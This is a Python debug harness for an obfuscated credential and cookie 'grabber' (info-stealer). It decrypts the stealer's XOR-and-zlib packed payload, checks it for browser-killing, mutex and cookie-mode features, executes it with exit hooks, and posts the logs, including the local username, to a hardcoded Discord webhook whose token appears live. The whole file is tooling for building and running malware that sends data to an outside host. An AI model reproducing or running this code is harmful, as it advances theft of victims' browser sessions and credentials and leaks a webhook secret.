"""
Debug v2 — testa cada etapa isoladamente sem exec().
Roda com python.exe (nao pythonw) pra ver todo o output.
"""
import os, sys, time, traceback, base64, zlib, json, urllib.request

WEBHOOK = "https://discord.com/api/webhooks/1554882578476179506/p1PLMEgZh3Nzz4sqrMbXkhYqzs0SWfQUB1Hr9TfjHQDuvJ0dn-axSmPNIGMeNzqrJeWZ"
GRABBER = r"d:\Arquivos importantes\Grabbers\Trabalho cyber\ms_packed.py"

lines = []
def log(msg):
    ts = time.strftime("%H:%M:%S")
    l = f"[{ts}] {msg}"
    print(l, flush=True)
    lines.append(l)

def send():
    try:
        txt = "\n".join(lines[-60:])
        for chunk_start in range(0, len(txt), 1900):
            chunk = txt[chunk_start:chunk_start+1900]
            data = json.dumps({"username":"DBG-v2","content":f"```\n{chunk}\n```"}).encode()
            req = urllib.request.Request(WEBHOOK, data=data, headers={"Content-Type":"application/json"})
            urllib.request.urlopen(req, timeout=10)
            time.sleep(0.5)
    except Exception as e:
        print(f"webhook fail: {e}")

try:
    log("=== DEBUG V2 START ===")
    log(f"exe: {sys.executable}")
    log(f"cwd: {os.getcwd()}")
    log(f"user: {os.environ.get('USERNAME','?')}")

    # 1. Read packed file
    log(f"reading: {GRABBER}")
    if not os.path.isfile(GRABBER):
        log("FATAL: packed file not found!")
        send()
        sys.exit(1)
    
    with open(GRABBER, "r") as f:
        code = f.read()
    log(f"size: {len(code)} bytes, lines: {code.count(chr(10))}")

    # 2. Manually decrypt the payload
    log("--- decrypting payload ---")
    exec_lines = code.strip().split("\n")
    
    key_b64 = None
    data_b64 = None
    for line in exec_lines:
        if '_k=_b.b64decode("' in line:
            key_b64 = line.split('"')[1]
        elif '_d=_b.b64decode("' in line:
            data_b64 = line.split('"')[1]
    
    if not key_b64 or not data_b64:
        log(f"FATAL: cant parse loader. key={key_b64 is not None} data={data_b64 is not None}")
        for i, l in enumerate(exec_lines):
            log(f"  {i}: {l[:100]}")
        send()
        sys.exit(1)
    
    key = base64.b64decode(key_b64)
    data = base64.b64decode(data_b64)
    log(f"key: {len(key)} bytes, data: {len(data)} bytes")
    
    decrypted = bytearray(len(data))
    kl = len(key)
    for i in range(len(data)):
        decrypted[i] = data[i] ^ key[i % kl]
    
    try:
        source = zlib.decompress(bytes(decrypted))
        log(f"decompressed: {len(source)} bytes")
    except Exception as e:
        log(f"FATAL: decompress failed: {e}")
        send()
        sys.exit(1)
    
    source_text = source.decode("utf-8", errors="replace")
    log(f"source lines: {source_text.count(chr(10))}")
    
    # 3. Check what happens at module level (before main())
    # Look for things that run immediately: mutex, _kill_browsers, imports
    log("--- checking module-level code ---")
    
    # Check for _run_disarm_phase call
    if "_run_disarm_phase()" in source_text:
        log("FOUND: _run_disarm_phase() at module level")
    
    # Check for _kill_browsers call
    if "_kill_browsers()" in source_text and "# _kill_browsers()" not in source_text:
        log("WARNING: _kill_browsers() is active at module level!")
    elif "# _kill_browsers()" in source_text:
        log("OK: _kill_browsers() is commented out")
    
    # Check for mutex
    if "_create_mutex()" in source_text:
        log("FOUND: _create_mutex() at module level")
        if "sys.exit(0)" in source_text:
            log("WARNING: mutex failure leads to sys.exit(0)")
    
    # Check COOKIE_MODE
    for line in source_text.split("\n"):
        if line.strip().startswith("COOKIE_MODE"):
            log(f"FOUND: {line.strip()}")
            break
    
    # 4. Try running it with all errors visible
    log("--- attempting exec with error capture ---")
    
    # Override sys.exit to catch silent exits
    original_exit = sys.exit
    exit_called = [False, None]
    def fake_exit(code=0):
        exit_called[0] = True
        exit_called[1] = code
        log(f"*** sys.exit({code}) INTERCEPTED ***")
        # Get the call stack
        import traceback as tb
        stack = tb.format_stack()
        for frame in stack[-5:]:
            for fl in frame.strip().split("\n"):
                log(f"  STACK: {fl}")
        raise SystemExit(code)
    
    sys.exit = fake_exit
    
    # Also override os._exit
    original_os_exit = os._exit
    def fake_os_exit(code=0):
        log(f"*** os._exit({code}) INTERCEPTED ***")
        import traceback as tb
        stack = tb.format_stack()
        for frame in stack[-5:]:
            for fl in frame.strip().split("\n"):
                log(f"  STACK: {fl}")
        raise SystemExit(code)
    os._exit = fake_os_exit
    
    try:
        g = {
            "__file__": GRABBER,
            "__name__": "__main__",
            "__builtins__": __builtins__,
        }
        compiled = compile(source, GRABBER, "exec")
        log("compile OK, executing...")
        exec(compiled, g)
        log("exec returned normally")
    except SystemExit as e:
        log(f"SystemExit: code={e.code}")
        if exit_called[0]:
            log(f"Exit was from our interceptor, code={exit_called[1]}")
    except Exception as e:
        log(f"EXCEPTION: {type(e).__name__}: {e}")
        log(traceback.format_exc()[-800:])
    finally:
        sys.exit = original_exit
        os._exit = original_os_exit
    
    log("=== DEBUG V2 END ===")

except Exception as e:
    log(f"RUNNER CRASH: {e}")
    log(traceback.format_exc())

send()

# Save to file too
try:
    with open(os.path.join(os.environ.get("TEMP","."), "grabber_debug2.log"), "w") as f:
        f.write("\n".join(lines))
except: pass
